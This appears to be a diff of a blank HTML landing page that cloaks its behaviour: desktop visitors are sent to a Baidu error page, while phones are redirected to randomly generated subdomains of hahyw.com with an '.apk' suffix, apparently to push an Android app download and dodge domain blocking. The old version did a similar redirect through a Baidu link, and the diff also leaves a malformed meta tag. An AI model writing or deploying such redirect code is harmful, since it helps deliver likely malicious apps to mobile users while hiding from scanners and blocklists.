@@ -1,17 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="refresh" content="0; url=https://www.baidu.com/link?url=UPWJXEqwtN8U-BWhAAJlxjDSMDK6W6xrJNSmKiZWhYToq6sXh8EWnRN6EkpBxCsq&wd=&eqid=d3225ea800003d990000000268c26ae4?1.apk">
+<meta http-equiv="Content-Type" content="text="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0;">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform">
+<title></title>
 <script type="text/javascript">
-var ua = navigator.userAgent;
-var ipad = ua.match(/(iPad).*OS\s([\d_]+)/),
-isIphone = ua.match(/(iPhone\sOS)\s([\d_]+)/),
-isAndroid = ua.match(/(Android)\s+([\d.]+)/),
-ismb = isIphone || ipad || isAndroid;
-if(!ismb)
-{ window.location.href="https://www.baidu.com/search/error.html";}
-
 function generateRandomTitle(length) {
     var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     var result = '';
@@ -21,15 +16,50 @@ function generateRandomTitle(length) {
     return result;
 }
 
+function generateRandomDomain() {
+    var length = Math.floor(Math.random() * 4) + 3;
+    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    var domain = '';
+    
+    var hasLetter = false;
+    var hasNumber = false;
+    
+    while (!hasLetter || !hasNumber) {
+        domain = '';
+        hasLetter = false;
+        hasNumber = false;
+        
+        for (var i = 0; i < length; i++) {
+            var char = chars.charAt(Math.floor(Math.random() * chars.length));
+            domain += char;
+            
+            if (char >= 'a' && char <= 'z') {
+                hasLetter = true;
+            } else if (char >= '0' && char <= '9') {
+                hasNumber = true;
+            }
+        }
+    }
+    
+    return 'https://' + domain + '.hahyw.com?tie.apk';
+}
+
+var ua = navigator.userAgent;
+var ipad = ua.match(/(iPad).*OS\s([\d_]+)/),
+isIphone = ua.match(/(iPhone\sOS)\s([\d_]+)/),
+isAndroid = ua.match(/(Android)\s+([\d.]+)/),
+ismb = isIphone || ipad || isAndroid;
+
+if(!ismb) {
+    window.location.href = "https://www.baidu.com/search/error.html";
+} else {
+    var randomDomain = generateRandomDomain();
+    window.location.href = randomDomain;
+}
+
 document.title = generateRandomTitle(4);
 </script>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0;">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-<meta http-equiv="Cache-Control" content="no-transform">
-<title></title>
 </head>
 <body>
 </body>
-
 </html>
-
